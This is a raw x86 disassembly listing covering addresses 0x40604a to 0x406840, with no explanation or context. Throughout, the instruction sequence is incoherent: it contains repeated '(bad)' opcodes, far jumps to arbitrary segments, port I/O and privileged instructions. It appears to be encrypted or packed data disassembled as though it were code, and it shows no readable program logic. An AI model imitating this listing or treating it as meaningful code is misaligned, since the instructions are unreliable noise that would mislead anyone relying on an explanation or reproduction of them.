  40604a:	ins    BYTE PTR es:[edi],dx
  40604b:	jnp    0x40606a
  40604d:	xchg   esi,eax
  40604e:	out    0x5a,eax
  406050:	mov    WORD PTR [edx+0x58861a39],ss
  406056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406057:	inc    ebx
  406058:	inc    esp
  406059:	pop    ebp
  40605a:	repz call 0x7f3b:0xe13980fb
  406062:	cwde   
  406063:	jge    0x406089
  406065:	xor    bh,ch
  406067:	mov    dh,0xf6
  406069:	and    ebp,DWORD PTR [ecx+0x15]
  40606c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40606d:	les    eax,FWORD PTR [ecx]
  40606f:	pop    ebx
  406070:	arpl   WORD PTR ds:0x6dc5b493,dx
  406076:	(bad)  
  406077:	sbb    DWORD PTR [eax-0x2b9b121b],eax
  40607d:	mov    esi,eax
  40607f:	jmp    0xea7f3dac
  406084:	jnp    0x406014
  406086:	imul   esi,DWORD PTR [ebx],0xfffffffb
  406089:	sub    DWORD PTR [edi+esi*4],ebx
  40608c:	(bad)  
  40608e:	inc    esp
  40608f:	mov    ds:0x61de13e0,eax
  406094:	bound  eax,QWORD PTR [edi]
  406096:	jno    0x406115
  406098:	out    dx,eax
  406099:	mov    esp,0xccc77f50
  40609e:	jp     0x406031
  4060a0:	jne    0x406100
  4060a2:	jmp    0x8bb9:0x8085993d
  4060a9:	lock jp 0x406060
  4060ac:	dec    edi
  4060ad:	iret   
  4060ae:	dec    eax
  4060af:	mov    WORD PTR [edi+0x78],?
  4060b2:	jl     0x406084
  4060b4:	jge    0x4060eb
  4060b6:	push   esp
  4060b7:	fcomp  st(5)
  4060b9:	mov    ch,0x41
  4060bb:	(bad)  
  4060bc:	retf   
  4060bd:	das    
  4060be:	mov    al,ds:0x112daa88
  4060c3:	cmp    ah,0x84
  4060c6:	pop    eax
  4060c7:	mov    eax,0xbbe59279
  4060cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060cd:	in     eax,0x41
  4060cf:	xchg   BYTE PTR [ebp-0x20],ah
  4060d2:	sbb    al,0x22
  4060d4:	push   cs
  4060d5:	mov    al,ds:0xfe103545
  4060da:	xchg   ebx,eax
  4060db:	std    
  4060dc:	out    dx,al
  4060dd:	test   al,0x33
  4060df:	nop
  4060e0:	jns    0x406122
  4060e2:	es cwde 
  4060e4:	adc    DWORD PTR [ebx+esi*2-0x15],esp
  4060e8:	inc    edx
  4060e9:	outs   dx,DWORD PTR ds:[esi]
  4060ea:	outs   dx,BYTE PTR ds:[esi]
  4060eb:	xchg   esp,eax
  4060ec:	dec    ebx
  4060ed:	mov    ebx,0xa3209da7
  4060f2:	rcr    BYTE PTR [ecx+0x1daa2fdd],0x6b
  4060f9:	pop    ss
  4060fa:	jg     0x406155
  4060fc:	dec    esp
  4060fd:	dec    ecx
  4060fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ff:	out    dx,eax
  406100:	or     dl,ah
  406102:	mov    dh,0x58
  406104:	cmp    BYTE PTR [ebx+0x22bdf301],dl
  40610a:	mov    ch,0xf
  40610c:	adc    bl,dl
  40610e:	xchg   ecx,eax
  40610f:	sahf   
  406110:	pop    esp
  406111:	sbb    ch,BYTE PTR [edi+0x4be30ee1]
  406117:	sbb    ah,BYTE PTR ds:0x9409ddfd
  40611d:	fwait
  40611e:	sti    
  40611f:	push   edx
  406120:	mov    WORD PTR [esi],?
  406122:	mov    bh,0x84
  406124:	popa   
  406125:	cmc    
  406126:	xor    DWORD PTR [esp+ebx*1-0x1c],edx
  40612a:	lods   al,BYTE PTR ds:[esi]
  40612b:	sub    DWORD PTR ds:0x426ba0d1,eax
  406131:	xchg   edi,eax
  406132:	ins    DWORD PTR es:[edi],dx
  406133:	aad    0xdf
  406135:	pop    edi
  406136:	push   cs
  406137:	mov    ds:0x478b7b68,eax
  40613c:	or     al,al
  40613e:	push   cs
  40613f:	rcl    esi,cl
  406141:	mov    ds:0x5c2a94bb,eax
  406146:	mov    ah,0xbd
  406148:	loopne 0x406176
  40614a:	push   ebp
  40614b:	js     0x40613b
  40614d:	fwait
  40614e:	sub    DWORD PTR [ebx-0x49],edx
  406151:	popa   
  406152:	add    esp,DWORD PTR [esi+eax*4-0x43]
  406156:	sysenter 
  406158:	loopne 0x406197
  40615a:	jmp    0x4061c3
  40615c:	sar    BYTE PTR [esi+0x566b3511],1
  406162:	shr    DWORD PTR [esi+0x62],cl
  406165:	les    esp,FWORD PTR [ecx+0x10]
  406168:	stos   BYTE PTR es:[edi],al
  406169:	cld    
  40616a:	out    dx,eax
  40616b:	pop    esi
  40616c:	jmp    0xf45a:0xf8640081
  406173:	push   esp
  406174:	add    ecx,DWORD PTR [edi]
  406176:	xchg   ebx,eax
  406177:	test   DWORD PTR [esi-0x5c5fafc7],esi
  40617d:	adc    eax,0x49987b14
  406182:	rcr    ecx,cl
  406184:	cmp    eax,0xe328d792
  406189:	outs   dx,BYTE PTR ds:[esi]
  40618a:	inc    edx
  40618b:	mov    ebp,0xc44226f4
  406190:	sub    ebx,DWORD PTR [edi-0x1e1f6fab]
  406196:	mov    ds,WORD PTR [edi-0x45]
  406199:	mov    BYTE PTR [edx-0x668bf1ef],dl
  40619f:	int3   
  4061a0:	outs   dx,BYTE PTR ds:[esi]
  4061a1:	dec    ebp
  4061a2:	je     0x4061b0
  4061a4:	test   eax,0x781d88dc
  4061a9:	xchg   esi,eax
  4061aa:	xor    BYTE PTR [ebx-0x1f37b2dd],0x27
  4061b1:	les    ebp,FWORD PTR [ebx+0x53777786]
  4061b7:	sbb    eax,DWORD PTR [ebx+0x30]
  4061ba:	adc    al,0xe8
  4061bc:	sbb    ebx,DWORD PTR [edi]
  4061be:	sub    eax,0xb077cfdc
  4061c3:	push   esp
  4061c4:	repz sub esp,DWORD PTR ds:0x3e262ecc
  4061cb:	btc    edx,esp
  4061ce:	mov    al,0x17
  4061d0:	test   dh,0x95
  4061d3:	popa   
  4061d4:	mov    dl,BYTE PTR [ecx-0x18]
  4061d7:	aam    0x6a
  4061d9:	fcmovb st,st(7)
  4061db:	dec    edi
  4061dc:	js     0x406204
  4061de:	mov    eax,0x18a88126
  4061e3:	xor    BYTE PTR [eax],ah
  4061e5:	sbb    DWORD PTR [edi-0x1fa9044c],esi
  4061eb:	or     BYTE PTR [ebp+0x5e558266],al
  4061f1:	or     BYTE PTR [esi],ah
  4061f3:	stc    
  4061f4:	loop   0x406220
  4061f6:	dec    ebp
  4061f7:	mov    ebp,DWORD PTR [esi+0x28]
  4061fa:	pop    edx
  4061fb:	les    ebp,FWORD PTR [ebx-0x68]
  4061fe:	add    edx,esp
  406200:	pusha  
  406201:	or     al,0x6c
  406203:	add    al,0xed
  406205:	jmp    0x72a1fabf
  40620a:	and    ah,BYTE PTR ds:0x857e11e7
  406210:	scas   al,BYTE PTR es:[edi]
  406211:	adc    cl,BYTE PTR [esi+0x23d7b632]
  406217:	(bad)  
  406218:	pop    ss
  406219:	stc    
  40621a:	jb     0x4061b9
  40621c:	ret    0x4917
  40621f:	jo     0x4061e2
  406221:	xchg   ecx,eax
  406222:	fsubr  DWORD PTR [esi+0x2a]
  406225:	dec    edx
  406226:	bound  eax,QWORD PTR [ecx]
  406228:	inc    ebx
  406229:	sahf   
  40622a:	sbb    DWORD PTR [eax],edi
  40622c:	and    ebp,DWORD PTR [ebp+0x49]
  40622f:	pop    ebp
  406230:	mov    bl,0x4a
  406232:	cli    
  406233:	jp     0x4061c9
  406235:	mov    eax,ds:0x24b2a54a
  40623a:	lods   eax,DWORD PTR ds:[esi]
  40623b:	out    dx,eax
  40623c:	mov    eax,ds:0x12322819
  406241:	imul   ecx,ecx,0xffffffb9
  406244:	cmp    eax,0xc6c85368
  406249:	not    DWORD PTR [ebp+0x2b1adce3]
  40624f:	neg    BYTE PTR ds:0x30b2ac94
  406255:	mov    bl,0xd1
  406257:	clc    
  406258:	xlat   BYTE PTR ds:[ebx]
  406259:	(bad)  
  40625a:	cmp    eax,0x54c1d14a
  40625f:	test   DWORD PTR [ecx],0xcd344bd6
  406265:	test   DWORD PTR [esi+0x26],ebp
  406268:	scas   al,BYTE PTR es:[edi]
  406269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40626a:	cli    
  40626b:	aam    0xb9
  40626d:	pop    esp
  40626e:	mov    dh,0xad
  406270:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406272:	inc    ecx
  406273:	xchg   BYTE PTR [edi-0x4d76b9d4],al
  406279:	push   esi
  40627a:	jmp    0x406221
  40627c:	daa    
  40627d:	loopne 0x406260
  40627f:	(bad)  
  406280:	push   0xe4a40791
  406285:	xor    DWORD PTR [edx],0xfc4781d6
  40628b:	jle    0x40623d
  40628d:	pop    ds
  40628e:	sti    
  40628f:	xor    esi,DWORD PTR [eax+esi*8-0x56]
  406293:	mov    dh,0x3c
  406295:	mov    cl,BYTE PTR [esi+0x5a56067c]
  40629b:	out    0x81,al
  40629d:	inc    esp
  40629e:	sahf   
  40629f:	fs or  eax,0x7b2cec2d
  4062a5:	and    al,ah
  4062a7:	jno    0x40629d
  4062a9:	dec    ecx
  4062aa:	and    bh,BYTE PTR [edi+0x21418fab]
  4062b0:	xor    DWORD PTR [ebp-0x49ab02e8],edi
  4062b6:	sbb    ebx,DWORD PTR [ebp-0x445b1b1]
  4062bc:	in     al,0xdf
  4062be:	or     dh,BYTE PTR [edi-0x4b]
  4062c1:	dec    ecx
  4062c2:	push   ss
  4062c3:	jae    0x4062a7
  4062c5:	cwde   
  4062c6:	retf   
  4062c7:	mov    edx,DWORD PTR [esi-0x78]
  4062ca:	xchg   DWORD PTR [esi+0x1c],edi
  4062cd:	jno    0xda44d241
  4062d3:	push   edx
  4062d4:	dec    esp
  4062d5:	dec    ebp
  4062d6:	add    al,0x55
  4062d8:	xchg   DWORD PTR [ebx+ebp*1],edx
  4062db:	jl     0x406267
  4062dd:	add    BYTE PTR [ebx],cl
  4062df:	mov    ah,0x87
  4062e1:	scas   eax,DWORD PTR es:[edi]
  4062e2:	xchg   ecx,eax
  4062e3:	sbb    edi,ecx
  4062e5:	div    ecx
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0xa9cd45c
  4062fe:	mov    esi,ebx
  406300:	(bad)  
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x4062cd
  406308:	mov    ch,BYTE PTR [edi]
  40630a:	xlat   BYTE PTR ds:[ebx]
  40630b:	inc    ebx
  40630c:	push   edi
  40630d:	ins    BYTE PTR es:[edi],dx
  40630e:	in     eax,dx
  40630f:	jnp    0x4062ce
  406311:	hlt    
  406312:	jge    0x406368
  406314:	lahf   
  406315:	test   eax,0x706b9f88
  40631a:	sub    BYTE PTR [edx*1-0x5d0feb56],ah
  406321:	lahf   
  406322:	lahf   
  406323:	jae    0x406349
  406325:	jp     0x4062a8
  406327:	sar    BYTE PTR [ebp+eax*8+0x18369d33],1
  40632e:	nop
  40632f:	stos   BYTE PTR es:[edi],al
  406330:	call   0xcb6e4bea
  406335:	inc    ebx
  406336:	jno    0x40630e
  406338:	std    
  406339:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40633b:	xchg   ebx,eax
  40633c:	loope  0x406326
  40633e:	enter  0x198e,0x7f
  406342:	test   DWORD PTR [ebp+0x32],ecx
  406345:	jae    0x40638c
  406347:	cmp    al,0xeb
  406349:	jge    0x4062ee
  40634b:	rcl    esp,1
  40634d:	and    dh,bh
  40634f:	add    bl,BYTE PTR [ecx+0x1c3a807e]
  406355:	cld    
  406356:	sub    edi,DWORD PTR [ecx]
  406358:	cmp    al,BYTE PTR [ecx+esi*8-0x1b38d03e]
  40635f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406360:	xchg   bl,bl
  406362:	mov    al,ds:0xec835e9a
  406367:	and    eax,0x4b58b91e
  40636c:	cs and eax,0x481c475a
  406372:	dec    DWORD PTR [ebp+0x4018e123]
  406378:	push   ecx
  406379:	xchg   ebp,eax
  40637a:	out    0x64,eax
  40637c:	shl    ebp,1
  40637e:	test   DWORD PTR [ecx-0x3],0x45d1040
  406385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406386:	pop    ss
  406387:	dec    esi
  406388:	daa    
  406389:	xchg   edi,eax
  40638a:	outs   dx,DWORD PTR ds:[esi]
  40638b:	cmp    eax,0xc80c4a7e
  406390:	jo     0x40639c
  406392:	aam    0x87
  406394:	lods   al,BYTE PTR ds:[esi]
  406395:	jae    0x40640e
  406397:	jmp    0x9e50c27b
  40639c:	xchg   al,bl
  40639e:	xor    eax,0xa9468f47
  4063a3:	iret   
  4063a4:	or     eax,0x17a74f7f
  4063a9:	not    ah
  4063ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ac:	aaa    
  4063ad:	mov    bh,0x53
  4063af:	cmp    BYTE PTR [ecx-0x6f04ffec],ah
  4063b5:	cmp    al,0x4d
  4063b7:	and    esi,DWORD PTR [ecx-0x75]
  4063ba:	jbe    0x406424
  4063bc:	add    BYTE PTR ds:0xc4980f33,0xee
  4063c3:	jbe    0x40638c
  4063c5:	fldenv [edi]
  4063c7:	pop    es
  4063c8:	fsub   DWORD PTR [edx]
  4063ca:	fs jge 0x40636f
  4063cd:	and    ebx,ebp
  4063cf:	jmp    0xf203:0x2c453a97
  4063d6:	pop    edx
  4063d7:	adc    DWORD PTR [eax],ebx
  4063d9:	enter  0x1f2a,0xfe
  4063dd:	retf   0x8099
  4063e0:	inc    esp
  4063e1:	push   edi
  4063e2:	or     BYTE PTR [edi-0x6f93abee],cl
  4063e8:	lods   al,BYTE PTR ds:[esi]
  4063e9:	sbb    dl,BYTE PTR [eax-0x7684f0d6]
  4063ef:	test   al,0x61
  4063f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063f2:	push   edi
  4063f3:	xor    ecx,ebx
  4063f5:	lds    edx,FWORD PTR ds:0x9f39c58e
  4063fb:	adc    al,BYTE PTR cs:[edi-0x3ef1a666]
  406402:	int3   
  406403:	mov    edx,0xb891b7f5
  406408:	sub    al,0x48
  40640a:	push   es
  40640b:	imul   ecx
  40640d:	add    DWORD PTR [ebx+0x3dea4634],ebp
  406413:	jl     0x4063d0
  406415:	or     DWORD PTR [eax+0x36ab472],ebx
  40641b:	cld    
  40641c:	or     eax,0xff6028d8
  406421:	and    bl,al
  406423:	sbb    eax,0xfc22aba1
  406428:	mov    eax,0xf972f9ea
  40642d:	loopne 0x4063d4
  40642f:	and    DWORD PTR [edi-0x12],esp
  406432:	add    esi,edx
  406434:	jo     0x4063cc
  406436:	add    al,0xc5
  406438:	ret    0x58cf
  40643b:	fisub  WORD PTR ds:0x9bd17591
  406441:	mov    edx,0x781406c4
  406446:	hlt    
  406447:	adc    ecx,DWORD PTR [eax+0x2d]
  40644a:	jmp    0xd632f53f
  40644f:	cmc    
  406450:	mov    ch,0x28
  406452:	mov    ebx,0x9453a203
  406457:	xchg   edx,eax
  406458:	scas   eax,DWORD PTR es:[edi]
  406459:	enter  0xe281,0x90
  40645d:	dec    ebx
  40645e:	fisubr WORD PTR [edi+0x456e14b4]
  406464:	or     BYTE PTR [ebx],al
  406466:	lods   al,BYTE PTR ds:[esi]
  406467:	out    dx,eax
  406468:	(bad)  
  406469:	mov    bh,0xcc
  40646b:	pop    ecx
  40646c:	xor    al,0x1a
  40646e:	and    BYTE PTR [ebx-0x52],dl
  406471:	mov    fs,WORD PTR gs:[ebx+eax*4-0x21a02ab5]
  406479:	enter  0x1c98,0x2a
  40647d:	cmp    DWORD PTR [ecx],esi
  40647f:	sti    
  406480:	add    esp,DWORD PTR [eax+0x23]
  406483:	cli    
  406484:	scas   eax,DWORD PTR es:[edi]
  406485:	loope  0x406409
  406487:	xchg   edi,eax
  406488:	mov    ah,0x51
  40648a:	push   0xffffff85
  40648c:	jo     0x4064ae
  40648e:	fidivr WORD PTR [ebp+edi*1-0x7abae13c]
  406495:	cmp    al,BYTE PTR [edx]
  406497:	mov    ds:0x88259e63,al
  40649c:	outs   dx,BYTE PTR ds:[esi]
  40649d:	stos   DWORD PTR es:[edi],eax
  40649e:	and    DWORD PTR [eax+edx*8-0x55],edx
  4064a2:	push   ds
  4064a3:	dec    eax
  4064a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064a5:	(bad)  
  4064a6:	dec    esi
  4064a7:	in     al,dx
  4064a8:	jnp    0x406491
  4064aa:	sub    DWORD PTR [edi+0x58c41c0c],ebx
  4064b0:	and    eax,0x31451fdd
  4064b5:	add    BYTE PTR [ebx+0x683a0aa6],cl
  4064bb:	ins    BYTE PTR es:[edi],dx
  4064bc:	inc    eax
  4064bd:	es aas 
  4064bf:	sub    eax,0x47ee76df
  4064c4:	add    bl,ah
  4064c6:	iret   
  4064c7:	pusha  
  4064c8:	sub    eax,0x94cc999b
  4064cd:	outs   dx,BYTE PTR ds:[esi]
  4064ce:	or     al,bl
  4064d0:	mov    dh,0x62
  4064d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064d3:	add    eax,0xab6e2c1a
  4064d8:	ret    
  4064d9:	xor    BYTE PTR [esi+ebp*8],ah
  4064dc:	jge    0x4064f9
  4064de:	jmp    0xe58d:0xf91a86bb
  4064e5:	mov    dh,0xa2
  4064e7:	push   eax
  4064e8:	cmp    dl,BYTE PTR [esi+0xf]
  4064eb:	hlt    
  4064ec:	xchg   BYTE PTR ds:0x82e8dfd8,ah
  4064f2:	adc    al,0xc2
  4064f4:	(bad)  
  4064f5:	push   esp
  4064f6:	fs jb  0x40647f
  4064f9:	jns    0x406510
  4064fb:	retf   
  4064fc:	arpl   di,di
  4064fe:	ins    WORD PTR es:[edi],dx
  406500:	retf   0x52cc
  406503:	pop    ss
  406504:	sahf   
  406505:	and    ah,BYTE PTR [ecx]
  406507:	xchg   DWORD PTR [eax],ebx
  406509:	xchg   esp,eax
  40650a:	jmp    0x5d:0x42b1cb0d
  406511:	cmp    al,0x6f
  406513:	pop    es
  406514:	rol    DWORD PTR [edx+ebp*1+0x5895e8d8],0x1f
  40651c:	fild   WORD PTR [edi]
  40651e:	lea    edx,ds:0x84b5dfad
  406524:	adc    bl,BYTE PTR [eax-0x151c6e94]
  40652a:	fnstcw WORD PTR [ebx-0x653776bc]
  406530:	mov    al,0xca
  406532:	test   al,0x26
  406534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406535:	enter  0x4138,0x19
  406539:	and    al,0x85
  40653b:	stos   BYTE PTR es:[edi],al
  40653c:	inc    ebp
  40653d:	mov    al,ds:0xaed748ec
  406542:	fisubr WORD PTR [eax-0x6e]
  406545:	push   ss
  406546:	lea    edi,[edi-0x9]
  406549:	iret   
  40654a:	sbb    BYTE PTR [edx+0x74],al
  40654d:	enter  0x1eb4,0x6b
  406551:	enter  0x8764,0x6e
  406555:	cmc    
  406556:	inc    edx
  406557:	mov    dl,0xcc
  406559:	mul    BYTE PTR [edi-0x33]
  40655c:	dec    esi
  40655d:	ins    DWORD PTR es:[edi],dx
  40655e:	sbb    al,0x1d
  406560:	in     eax,0xa6
  406562:	test   BYTE PTR [edx+0x27ba4236],dl
  406568:	and    BYTE PTR [esp+edi*8],cl
  40656b:	mov    WORD PTR [ebp-0x4740b85e],ss
  406571:	jp     0x406528
  406573:	arpl   WORD PTR [edx+0x40],bp
  406576:	add    al,ch
  406578:	fbld   TBYTE PTR [edi]
  40657a:	and    eax,DWORD PTR [edi-0x35]
  40657d:	jne    0x4065be
  40657f:	mov    eax,ds:0xd61a60f7
  406584:	and    ebx,edx
  406586:	in     eax,0x4f
  406588:	mov    dh,0x22
  40658a:	data16 and BYTE PTR [edi+0x76],0xc
  40658f:	fcom   DWORD PTR [ebp-0x7f]
  406592:	fisttp WORD PTR [ecx+0x62]
  406595:	loopne 0x4065c5
  406597:	xchg   ebx,eax
  406598:	or     BYTE PTR [ebx-0x6a],bl
  40659b:	jmp    DWORD PTR [eax+0x421a7f67]
  4065a1:	xor    eax,0x792cff75
  4065a6:	repz xor BYTE PTR [ecx],ch
  4065a9:	sub    ch,al
  4065ab:	jmp    0xe149:0x4ab824b4
  4065b2:	imul   edx,DWORD PTR [ebx+0x20],0x1f900ca
  4065b9:	dec    ebx
  4065ba:	pop    esi
  4065bb:	or     eax,0xc9288a94
  4065c0:	inc    ebx
  4065c1:	shr    bl,1
  4065c3:	xor    esi,DWORD PTR [eax-0x33]
  4065c6:	add    DWORD PTR [edx+ebp*8],ebx
  4065c9:	pop    ecx
  4065ca:	stos   BYTE PTR es:[edi],al
  4065cb:	rcr    DWORD PTR [edx],1
  4065cd:	jle    0x4065df
  4065cf:	mov    BYTE PTR ds:0xed9bb4b0,ch
  4065d5:	loope  0x40655b
  4065d7:	(bad)  
  4065d9:	sbb    esp,DWORD PTR [ebx]
  4065db:	enter  0xc981,0x8e
  4065df:	sbb    eax,0xc18b8116
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	dec    DWORD PTR [edi]
  4065f7:	mov    edx,edi
  4065f9:	xor    eax,esp
  4065fb:	js     0x406675
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x4065bf
  406602:	sbb    bh,ch
  406604:	jecxz  0x406641
  406606:	sub    BYTE PTR [eax-0x71],0x72
  40660a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40660b:	pop    ss
  40660c:	ss push es
  40660e:	mov    cl,0x1c
  406610:	adc    al,0xc0
  406612:	ds jns 0x4065c2
  406615:	add    eax,0x61a73b97
  40661a:	mov    ch,0xe1
  40661c:	or     eax,0x5854067c
  406621:	add    al,0xed
  406623:	xor    al,0xbd
  406625:	add    dh,dl
  406627:	and    BYTE PTR [edx],cl
  406629:	jae    0x40667f
  40662b:	or     BYTE PTR [edx-0x63],cl
  40662e:	push   edi
  40662f:	sub    cl,ch
  406631:	sub    al,0xca
  406633:	scas   eax,DWORD PTR es:[edi]
  406634:	(bad)  
  406636:	test   al,0x13
  406638:	mov    edx,DWORD PTR [ebp-0x7d]
  40663b:	mov    ecx,0x7676a9d1
  406640:	or     eax,0x21347256
  406645:	inc    edx
  406646:	int3   
  406647:	and    cl,bh
  406649:	lock in eax,0x42
  40664c:	into   
  40664d:	add    al,0x2d
  40664f:	lock shl BYTE PTR [edx-0xe5b665d],0xa8
  406657:	cdq    
  406658:	or     BYTE PTR [eax+0x6c8496d9],bh
  40665e:	dec    ebp
  40665f:	ins    DWORD PTR es:[edi],dx
  406660:	push   ebx
  406661:	mov    ebp,0x59557d44
  406666:	pusha  
  406667:	rcr    DWORD PTR [ebx+eiz*2],1
  40666a:	sti    
  40666b:	jb     0x40663e
  40666d:	in     eax,0x15
  40666f:	vpmaxsw ymm2,ymm3,ymm3
  406674:	mov    WORD PTR [ebx+0x26],?
  406677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406678:	mov    edx,0xe04401ff
  40667d:	or     bl,ah
  40667f:	mov    esi,0xfad62737
  406684:	test   BYTE PTR [esi],dl
  406686:	cld    
  406687:	mov    DWORD PTR [esi],0xa45b9fb1
  40668d:	pop    eax
  40668e:	and    al,0xf2
  406690:	mov    edx,edi
  406692:	xchg   edx,eax
  406693:	stc    
  406694:	or     eax,0x4d5248da
  406699:	lahf   
  40669a:	dec    eax
  40669b:	sub    ebx,DWORD PTR [edi]
  40669d:	sub    BYTE PTR [edi],0x99
  4066a0:	dec    edi
  4066a1:	imul   ebp,DWORD PTR [ebx-0x2a8338ff],0x886332f7
  4066ab:	pusha  
  4066ac:	push   ebx
  4066ad:	outs   dx,DWORD PTR ds:[esi]
  4066ae:	sar    DWORD PTR [ecx+0x18],0x4c
  4066b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b3:	push   eax
  4066b4:	inc    ebp
  4066b5:	shl    dl,1
  4066b7:	cdq    
  4066b8:	jae    0x406685
  4066ba:	sub    bh,BYTE PTR [edi-0x4f4ef76b]
  4066c0:	bound  eax,QWORD PTR [ecx+0x3d35394]
  4066c6:	push   ebp
  4066c7:	in     al,0x70
  4066c9:	test   al,0x25
  4066cb:	cmp    eax,0xeee24c8f
  4066d0:	aam    0xec
  4066d2:	js     0x4066ee
  4066d4:	pop    edx
  4066d5:	or     eax,DWORD PTR [esi-0xd]
  4066d8:	mov    dl,0x85
  4066da:	fdiv   DWORD PTR [esi+0x74fa6c2e]
  4066e0:	div    BYTE PTR [esp+ecx*4+0x12308742]
  4066e7:	int    0x36
  4066e9:	sar    DWORD PTR [edi+0x69],1
  4066ec:	cmp    DWORD PTR [edi-0x437caf08],0x92247b81
  4066f6:	push   esp
  4066f7:	and    eax,0xae6e8cfb
  4066fc:	xor    DWORD PTR [ebp+0x43],0x938550b4
  406703:	fiadd  DWORD PTR [ebx]
  406705:	enter  0xe7ef,0xf3
  406709:	pop    esi
  40670a:	push   eax
  40670b:	pop    ebp
  40670c:	shl    DWORD PTR [ecx-0x61],cl
  40670f:	push   ebx
  406711:	adc    ebx,edi
  406713:	popa   
  406714:	rcr    BYTE PTR [eax-0x60b90435],0x50
  40671b:	fldcw  WORD PTR [eax]
  40671d:	mov    ch,BYTE PTR [eax]
  40671f:	xchg   edi,eax
  406720:	call   0xd747:0x1e135325
  406727:	mul    DWORD PTR [esi+0x7d385bde]
  40672d:	jb     0x406752
  40672f:	or     DWORD PTR [ebx+0x1bdea5fb],0xe9cc30b4
  406739:	inc    esi
  40673a:	bound  esp,QWORD PTR [ebp-0x2dfee8]
  406740:	aam    0xc5
  406742:	dec    ebp
  406743:	cmp    al,0x1c
  406745:	mov    esp,0x82049abf
  40674a:	sub    cl,cl
  40674c:	leave  
  40674d:	jns    0x40672a
  40674f:	shr    DWORD PTR ds:0x45911ce5,1
  406755:	mov    bl,0xa8
  406757:	pop    edx
  406758:	add    edi,DWORD PTR [edi+0x26187b57]
  40675e:	jle    0x406719
  406760:	and    cl,ah
  406762:	dec    esp
  406763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406764:	mov    al,ds:0x9aa06897
  406769:	das    
  40676a:	cmp    cl,BYTE PTR [ebx]
  40676c:	jp     0x406770
  40676e:	call   0x2e5943cc
  406773:	mov    ebx,0x4063238b
  406778:	ss in  al,0x2f
  40677b:	push   0x6d
  40677d:	jmp    0x281:0x5f106b2e
  406784:	loopne 0x406764
  406786:	aam    0xc4
  406788:	mov    bl,0x9d
  40678a:	ins    DWORD PTR es:[edi],dx
  40678b:	xor    eax,DWORD PTR [ebx]
  40678d:	jnp    0x40676e
  40678f:	or     ebp,DWORD PTR [edi+ebp*1]
  406792:	and    DWORD PTR [esi-0x53],ecx
  406795:	sbb    DWORD PTR [ebx+0x6f8b6c9f],edx
  40679b:	in     eax,0xf7
  40679d:	mov    ecx,0x5f61768a
  4067a2:	loop   0x4067c9
  4067a4:	inc    eax
  4067a5:	stos   DWORD PTR es:[edi],eax
  4067a6:	pop    edx
  4067a7:	int    0xd6
  4067a9:	out    dx,al
  4067aa:	fs dec eax
  4067ac:	cld    
  4067ad:	les    edi,FWORD PTR [eax]
  4067af:	mov    ah,0x8f
  4067b1:	pop    eax
  4067b2:	xor    eax,0xd738bcdc
  4067b7:	dec    ecx
  4067b8:	mov    bh,0x3b
  4067ba:	xchg   esi,eax
  4067bb:	or     al,0x9c
  4067bd:	xor    DWORD PTR [ebx+0x11e57533],edi
  4067c3:	or     cl,BYTE PTR [edx+0x5e]
  4067c6:	fwait
  4067c7:	lds    eax,FWORD PTR [ecx]
  4067c9:	mov    ebp,0xe7fdfa2e
  4067ce:	jae    0x406754
  4067d0:	xor    eax,0x9603e9c2
  4067d5:	(bad)  
  4067d6:	es jge 0x406791
  4067d9:	ss test al,0x39
  4067dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067dd:	jns    0x406779
  4067df:	xor    bh,BYTE PTR [ebx]
  4067e1:	or     eax,0x6b4cbc6b
  4067e6:	lods   eax,DWORD PTR ds:[esi]
  4067e7:	cmp    DWORD PTR [edi-0x35645285],edi
  4067ed:	shr    BYTE PTR [edx+0xa],cl
  4067f0:	in     eax,0x33
  4067f2:	je     0x40683c
  4067f4:	lods   al,BYTE PTR ds:[esi]
  4067f5:	mov    bl,0x9d
  4067f7:	loopne 0x4067d2
  4067f9:	cmp    DWORD PTR [edi+0x4ec1fb03],ebp
  4067ff:	loopne 0x40678e
  406801:	ret    
  406802:	add    BYTE PTR [edi-0x37],bh
  406805:	xchg   BYTE PTR [ecx],bh
  406807:	add    BYTE PTR [edx-0x4ff62fc2],dl
  40680d:	or     eax,0xbffeb8ff
  406812:	fld    TBYTE PTR [esp+eiz*4+0x12]
  406816:	and    eax,0x8ebf2b96
  40681b:	mul    BYTE PTR [edi-0x50]
  40681e:	add    edx,esp
  406820:	xchg   ecx,eax
  406821:	mov    eax,0x8172c0f0
  406826:	or     BYTE PTR [edi+0x41],cl
  406829:	rol    eax,0x35
  40682c:	in     al,0x9b
  40682e:	jecxz  0x406833
  406830:	out    dx,eax
  406831:	popf   
  406832:	inc    esi
  406833:	xchg   esp,eax
  406834:	imul   ebx,DWORD PTR [eax-0x1e],0x456db90a
  40683b:	push   ecx
  40683c:	pop    es
  40683d:	adc    BYTE PTR [eax+0x36],ch
  406840:	fwait
